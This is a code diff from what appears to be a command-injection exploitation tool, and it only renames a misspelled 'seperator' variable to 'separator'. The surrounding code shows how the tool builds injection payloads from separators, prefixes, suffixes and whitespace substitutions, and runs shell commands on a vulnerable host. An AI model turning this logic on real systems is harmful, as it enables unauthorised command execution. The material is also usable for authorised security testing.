@@ -110,10 +110,10 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
   for whitespace in settings.WHITESPACES:
     for prefix in settings.PREFIXES:
       for suffix in settings.SUFFIXES:
-	for seperator in settings.SEPERATORS:
+	for separator in settings.SEPARATORS:
 	  
-	  # Check for bad combination of prefix and seperator
-	  combination = prefix + seperator
+	  # Check for bad combination of prefix and separator
+	  combination = prefix + separator
 	  if combination in settings.JUNK_COMBINATION:
 	    prefix = ""
 
@@ -131,7 +131,7 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	  try:
 	    
 	    # Classic decision payload (check if host is vulnerable).
-	    payload = classic_payloads.decision(seperator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
+	    payload = classic_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
 			    
 	    # Check if defined "--prefix" option.
 	    if menu.options.prefix:
@@ -149,7 +149,7 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	    else:
 	      payload = payload + suffix
 
-	    if seperator == " " :
+	    if separator == " " :
 	      payload = re.sub(" ", "%20", payload)
 	    else:
 	      payload = re.sub(" ", whitespace, payload)
@@ -295,9 +295,9 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 		    
 		  else:
 		    # Execute shell commands on vulnerable host.
-		    payload = classic_payloads.cmd_execution(seperator,TAG,cmd)
+		    payload = classic_payloads.cmd_execution(separator,TAG,cmd)
 		    
-		    if seperator == " " :
+		    if separator == " " :
 		      payload = re.sub(" ", "%20", payload)
 		    else:
 		      payload = re.sub(" ", whitespace, payload)
